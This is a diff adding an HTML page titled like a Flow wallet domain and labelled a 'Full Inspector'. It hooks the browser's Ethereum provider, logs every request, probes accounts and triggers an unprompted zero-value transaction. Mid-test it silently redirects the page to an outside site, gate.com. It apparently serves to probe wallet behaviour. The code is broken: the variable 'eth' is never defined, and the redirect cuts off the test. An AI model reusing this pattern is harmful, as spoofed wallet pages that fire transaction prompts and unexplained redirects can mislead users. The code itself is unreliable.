@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>link.wallet.flow.com</title>
+<style>
+body {
+  background:#0b0b0b;
+  color:#7dffb3;
+  font-family: monospace;
+}
+h3 { color:#5fff87 }
+pre {
+  background:#141414;
+  padding:12px;
+  white-space:pre-wrap;
+  font-size:12px;
+}
+.warn { color:#ffd166 }
+.err  { color:#ff6b6b }
+.ok   { color:#5fff87 }
+</style>
+</head>
+<body>
+<h3>Flow Wallet EVM – Full Inspector</h3>
+<pre id="log"></pre>
+
+<script>
+const logEl = document.getElementById("log");
+const log = m => logEl.textContent += m + "\n";
+
+log("[*] waiting provider...");
+
+const wait = setInterval(async () => {
+  if (!window.ethereum) return;
+  clearInterval(wait);
+
+
+  eth.on?.("accountsChanged", a =>
+    log("[event] accountsChanged: " + JSON.stringify(a))
+  );
+  eth.on?.("chainChanged", c =>
+    log("[event] chainChanged: " + c)
+  );
+
+  const originalRequest = eth.request.bind(eth);
+  eth.request = async (payload) => {
+    log("\n[>] request: " + JSON.stringify(payload));
+    try {
+      const res = await originalRequest(payload);
+      log("[<] response: " + JSON.stringify(res));
+      return res;
+    } catch (e) {
+      log("[!] error: " + JSON.stringify(e));
+      throw e;
+    }
+  };
+
+  try { await eth.request({ method: "eth_chainId" }); } catch(e) {}
+  try { await eth.request({ method: "eth_accounts" }); } catch(e) {}
+  try { await eth.request({ method: "eth_coinbase" }); } catch(e) {}
+  try { await eth.request({ method: "net_version" }); } catch(e) {}
+  log("[+] isConnected(): " + eth.isConnected?.());
+  log("");
+
+  log("[*] Starting automatic tests...\n");
+
+  log("[TEST] eth_sendTransaction (0 value)");
+  location.href="https://gate.com"
+  try {
+    await eth.request({
+      method: "eth_sendTransaction",
+      params: [{
+        from: eth.address,
+        to: eth.address,
+        value: "0x0"
+      }]
+    });
+    log(".ok   eth_sendTransaction succeeded\n");
+  } catch (e) {
+    log(".err  eth_sendTransaction failed/rejected\n");
+  }
+
+  log("[*] All automatic tests completed.");
+}, 100);
+</script>
+</body>
+</html>
